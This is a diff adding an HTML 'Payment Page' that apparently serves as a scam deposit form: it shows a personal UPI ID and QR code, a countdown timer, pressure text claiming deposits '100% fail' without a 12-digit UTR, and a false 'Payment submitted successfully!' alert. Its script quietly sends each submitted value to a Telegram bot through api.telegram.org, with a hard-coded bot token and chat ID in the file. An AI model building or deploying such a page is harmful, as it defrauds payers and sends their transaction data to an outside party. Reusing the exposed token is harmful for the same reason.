@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Payment Page</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #fff;
+        color: #000;
+      }
+
+      .container {
+        padding: 20px;
+        max-width: 400px;
+        margin: 0 auto;
+        text-align: center;
+      }
+
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .balance {
+        font-size: 24px;
+        color: #00aaff;
+      }
+
+      .time-container {
+        text-align: right;
+      }
+
+      .time {
+        font-size: 18px;
+      }
+
+      hr {
+        margin: 20px 0;
+        border: 1px solid #ddd;
+      }
+
+      .upi-id {
+        font-size: 18px;
+        color: red;
+        margin: 10px 0;
+      }
+
+      .qr-code {
+        margin: 20px 0;
+        text-align: center;
+      }
+
+      .qr-code img {
+        max-width: 100%;
+        height: auto;
+      }
+
+      .instructions {
+        font-size: 16px;
+        color: orange;
+        margin: 20px 0;
+      }
+
+      .payment-options {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+        gap: 10px;
+        margin: 20px 0;
+      }
+
+      .payment-option {
+        position: relative;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .payment-option img {
+        max-width: 50px;
+        max-height: 50px;
+      }
+
+      .selected {
+        border-color: green;
+      }
+
+      .selected::before {
+        content: "✔";
+        position: absolute;
+        top: 5px;
+        left: 5px;
+        font-size: 20px;
+        color: green;
+      }
+
+      .utr-input {
+        margin: 20px 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .utr-input input {
+        padding: 10px;
+        font-size: 16px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        width: 100%;
+        max-width: 150px;
+        margin-right: 10px;
+      }
+
+      .utr-input button {
+        padding: 10px;
+        font-size: 16px;
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+
+      .important-reminder {
+        font-size: 14px;
+        color: red;
+        margin: 20px 0;
+        text-align: left;
+      }
+
+      .warning {
+        background-color: #f9f9f9;
+        border-left: 5px solid #007bff;
+        padding: 10px;
+        margin-top: 20px;
+        font-size: 12px;
+        text-align: left;
+      }
+
+      .warning span {
+        font-weight: bold;
+      }
+
+      /* Media Queries for Responsiveness */
+      @media (max-width: 600px) {
+        .container {
+          padding: 10px;
+        }
+
+        .balance {
+          font-size: 20px;
+        }
+
+        .time {
+          font-size: 16px;
+        }
+
+        .upi-id {
+          font-size: 16px;
+        }
+
+        .instructions {
+          font-size: 14px;
+        }
+
+        .important-reminder {
+          font-size: 12px;
+        }
+
+        .warning {
+          font-size: 10px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="header">
+        <span class="balance">₹ </span>
+        <div class="time-container">
+          <span class="time" id="timer">05:50</span>
+        </div>
+      </div>
+      <hr />
+      <div class="upi-id">UPI ID: sailakannans@okaxis</div>
+      <div class="qr-code">
+        <img src="QR.jpeg" alt="QR Code" />
+      </div>
+      <div class="instructions">Have you paid successfully?</div>
+      <div class="payment-options">
+        <div class="payment-option" onclick="selectPaymentOption(this)">
+          <img src="download (1).jfif" alt="Paytm" />
+        </div>
+        <div class="payment-option" onclick="selectPaymentOption(this)">
+          <img src="download (2).jfif" alt="PhonePe" />
+        </div>
+        <div class="payment-option" onclick="selectPaymentOption(this)">
+          <img src="download (3).jfif" alt="GooglePay" />
+        </div>
+        <div class="payment-option" onclick="selectPaymentOption(this)">
+          <img src="th.jfif" alt="Other Bank" />
+        </div>
+      </div>
+      <form onsubmit="handleSubmit(event)">
+        <div class="utr-input">
+          <input
+            type="text"
+            id="message"
+            placeholder="Input 12 digits here"
+            required
+          />
+          <button type="submit">Submit</button>
+        </div>
+      </form>
+      <div class="important-reminder">
+        Important reminder: After completing the UPI transaction, please backfill Ref No./UTR No./Google Pay: UPI Transaction ID/Freecharge: Transaction ID (12 digits). If you do not backfill UTR, 100% of the deposit transaction will fail. Please be sure to backfill!
+      </div>
+      <div class="warning">
+        <span>Warning:</span> Please confirm that the above account information is correct, and use this account to make the payment, otherwise the payment will not be completed correctly.
+      </div>
+    </div>
+
+    <script>
+      // Timer function
+      function startTimer() {
+        var timerElement = document.getElementById("timer");
+        var timeArray = timerElement.textContent.split(":");
+        var minutes = parseInt(timeArray[0]);
+        var seconds = parseInt(timeArray[1]);
+
+        function updateTimer() {
+          seconds--;
+          if (seconds < 0) {
+            seconds = 59;
+            minutes--;
+          }
+          if (minutes < 0) {
+            minutes = 0;
+            seconds = 0;
+          }
+
+          timerElement.textContent =
+            (minutes < 10 ? "0" : "") +
+            minutes +
+            ":" +
+            (seconds < 10 ? "0" : "") +
+            seconds;
+
+          if (minutes > 0 || seconds > 0) {
+            setTimeout(updateTimer, 1000);
+          }
+        }
+
+        updateTimer();
+      }
+
+      window.onload = startTimer;
+
+      // Handle form submission
+      function handleSubmit(event) {
+        event.preventDefault();
+
+        // Get the UTR number from the input field
+        var message = document.getElementById('message').value;
+
+        // Call the function to send the message to Telegram
+        sendMessage(message);
+
+        // Optionally, display a success alert and redirect
+        alert("Payment submitted successfully!");
+      }
+
+      // Function to send the message to Telegram
+      function sendMessage(message) {
+        // Replace with your chat ID or group/channel ID
+        var chatId = '5786268361';  // Use your numeric chat ID (not the username)
+
+        // Replace with your Telegram bot token
+        var botToken = '7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc';
+
+        // Construct the Telegram API URL with the bot token, chat ID, and the message
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Send a request to the Telegram API
+        fetch(url)
+          .then(response => response.json()) // Parse the response as JSON
+          .then(data => {
+            // If the message is sent successfully, show an alert
+            if (data.ok) {
+              alert("Message sent successfully!");
+            } else {
+              // If there's an error, show an error message
+              alert("Error sending message: " + data.description);
+            }
+          })
+          .catch(error => {
+            // Handle any errors that occur during the request
+            console.error('Error:', error);
+            alert("Failed to send message.");
+          });
+      }
+
+      // Mark selected payment option
+      function selectPaymentOption(element) {
+        var options = document.querySelectorAll(".payment-option");
+        options.forEach((option) => option.classList.remove("selected"));
+        element.classList.add("selected");
+      }
+    </script>
+  </body>
+</html>
